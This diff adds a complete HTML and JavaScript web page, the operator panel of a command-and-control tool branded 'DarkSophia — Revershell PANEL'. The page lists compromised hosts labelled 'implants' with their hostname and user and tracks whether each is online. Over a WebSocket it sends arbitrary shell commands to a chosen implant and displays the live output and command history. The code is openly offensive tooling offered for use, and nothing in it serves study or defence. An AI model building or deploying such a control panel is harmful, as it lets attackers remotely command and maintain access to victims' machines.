@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>DarkSophia — Revershell PANEL</title>
+<style>
+    body {
+        background: #0a0a0f;
+        color: white;
+        font-family: 'JetBrains Mono', monospace;
+        margin: 0;
+    }
+    h1 {
+        text-align:center;
+        padding:20px;
+        color:#ff0066;
+        text-shadow:0 0 12px #ff0066;
+        letter-spacing:2px;
+    }
+    .layout { display:flex; height:90vh; padding:20px; gap:20px; }
+    .left {
+        width:30%; background:#111; padding:20px;
+        border-radius:10px; border:1px solid #ff0066;
+        overflow-y: auto;
+    }
+    .right {
+        flex:1; background:#111; padding:20px;
+        border-radius:10px; border:1px solid #0f0;
+    }
+    .implant {
+        padding:10px; margin:6px 0; border-radius:6px;
+        border:1px solid #333;
+        cursor:pointer; transition:0.2s;
+    }
+    .implant.online {
+        border-color:#00ff00; color:#00ff00;
+    }
+    .implant.offline {
+        border-color:#ff0066; color:#ff0066; opacity:0.6;
+    }
+    .implant:hover { background:#222; }
+
+    #output {
+        background:black; color:#00ff00;
+        height:70%; padding:12px;
+        border-radius:8px;
+        overflow-y:auto;
+        border: 1px solid #0f0;
+        white-space: pre-wrap;
+    }
+
+    #cmd {
+        width:100%; padding:10px;
+        background:#000; color:#ff0066;
+        border:1px solid #ff0066;
+        margin-top:20px;
+        border-radius:8px;
+    }
+
+    button {
+        width:100%; padding:12px;
+        background:#ff0066; color:white;
+        border:none; border-radius:8px;
+        margin-top:10px; cursor:pointer;
+        font-size:15px;
+        transition:0.15s;
+    }
+
+    button:hover {
+        background:#ff3385;
+        box-shadow:0 0 12px #ff0066;
+    }
+
+    #history {
+        height:15%;
+        background:#000;
+        border:1px solid #666;
+        color:#ffccff;
+        padding:10px; margin-top:10px;
+        overflow:auto;
+        border-radius:6px;
+        white-space:pre-wrap;
+    }
+</style>
+</head>
+
+<body>
+
+<h1>DarkSophia — COMMAND & CONTROL</h1>
+
+<div class="layout">
+
+    <div class="left">
+        <h2>Implants</h2>
+        <div id="implant-list"></div>
+
+        <h3>Command</h3>
+        <input id="cmd" placeholder="whoami">
+        <button onclick="sendCommand()">Send Command</button>
+
+        <h3>History</h3>
+        <pre id="history"></pre>
+    </div>
+
+    <div class="right">
+        <h2>Live Output</h2>
+        <pre id="output"></pre>
+    </div>
+
+</div>
+
+<script>
+let ws = new WebSocket(`ws://${location.host}/panel`);
+let current = null;
+let implants = {};
+let history = {};
+
+ws.onopen = () => {
+    console.log("[+] PANEL CONNECTED");
+    ws.send("REQ_UPDATE");
+};
+
+ws.onmessage = e => {
+    let data = JSON.parse(e.data);
+    implants = data.implants;
+    history = data.history;
+    updateUI();
+};
+
+function updateUI() {
+    let list = document.getElementById("implant-list");
+    list.innerHTML = "";
+
+    for (let id in implants) {
+        let i = implants[id];
+        let div = document.createElement("div");
+
+        div.className = "implant " + (i.online ? "online" : "offline");
+        div.textContent = `${id} — ${i.hostname}\\${i.user}`;
+
+        div.onclick = () => {
+            current = id;
+            updateUI();
+        };
+        list.appendChild(div);
+    }
+
+    if (current && implants[current]) {
+        document.getElementById("output").textContent = implants[current].output || "";
+        document.getElementById("history").textContent = (history[current] || []).join("\\n");
+    }
+}
+
+function sendCommand() {
+    if (!current) return alert("Select an implant first.");
+    let cmd = document.getElementById("cmd").value;
+    ws.send(`CMD::${current}::${cmd}`);
+}
+</script>
+
+</body>
+</html>
